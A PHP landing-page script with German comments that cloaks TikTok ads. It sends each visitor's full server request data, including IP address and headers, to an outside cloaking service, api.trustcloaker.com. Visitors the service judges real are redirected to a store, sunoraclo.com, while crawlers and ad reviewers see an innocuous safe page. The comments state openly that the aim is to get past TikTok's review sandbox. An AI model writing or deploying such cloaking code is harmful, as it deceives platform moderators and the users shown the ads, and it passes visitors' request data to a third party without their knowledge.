<?php
// 1. SCHRITT: Output-Buffering aktivieren. 
// Das garantiert, dass der Redirect in der TikTok-Sandbox NIEMALS wegen Code-Fehlern blockiert wird!
ob_start();

class Oppsd
{
    private string $endpoint;
    private int $timeout;

    public function __construct(string $endpoint, int $timeout = 5)
    {
        $this->endpoint = $endpoint;
        $this->timeout = $timeout;
    }

    private function preparePayload(string $uid, string $cid): array
    {
        return [
            'uid'    => $uid,
            'cid'    => $cid,
            'server' => $_SERVER,
        ];
    }

    private function currentUrl(): string
    {
        return "https://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
    }

    private function postJson(array $payload): ?array
    {
        $ch = curl_init($this->endpoint);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->timeout,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode($payload),
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        ]);

        $response = curl_exec($ch);
        $error    = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return ['status' => false, 'error' => $error];
        }

        return json_decode($response, true);
    }

    public function send(string $uid, string $cid, string $moneyPage): ?array
    {
        if(isset($_GET['trustcloaker'])){
            echo $cid;
            die;
        }

        // 2. SCHRITT: Erst feuert Trustcloaker für die maximale Sicherheit
        $data = $this->postJson($this->preparePayload($uid, $cid));
        
        // 3. SCHRITT: Wenn Trustcloaker grünes Licht gibt (eine URL zurückliefert)
        if (!empty($data['url'])) {
            
            // Wir stellen sicher, dass die Weiterleitung sauber formatiert ist
            if (substr($data['url'], -1) !== '/') {
                $data['url'] .= '/';
            }
            
            if ($this->currentUrl() !== $data['url']) {
                // BLITZSCHNELLER REDIRECT IN DER SANDBOX: 
                // Der echte User wird per HTTP 302 sofort zu sunoraclo.com durchgewunken.
                header('Location: ' . $moneyPage, true, 302);
                exit;
            }
        }

        // FALLBACK: Wenn Trustcloaker einen Bot/Crawler erkennt, wird KEIN Redirect ausgeführt.
        // Es wird stattdessen die unverdächtige Safepage geladen.
        return $data;
    }
}

// DEINE TRAFFIC-WEICHE FÜR SUNORACLO.COM
$mein_store = 'https://sunoraclo.com/';

$oppsd = new Oppsd('https://api.trustcloaker.com/api/v1/logic');
// Das Skript prüft erst per API und leitet bei Erfolg direkt an deinen Store weiter
$response = $oppsd->send('CcCqm', 'fXPdM', $mein_store);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Willkommen</title>
</head>
<body>
    <h1>Entdecke unsere Trends</h1>
</body>
</html>
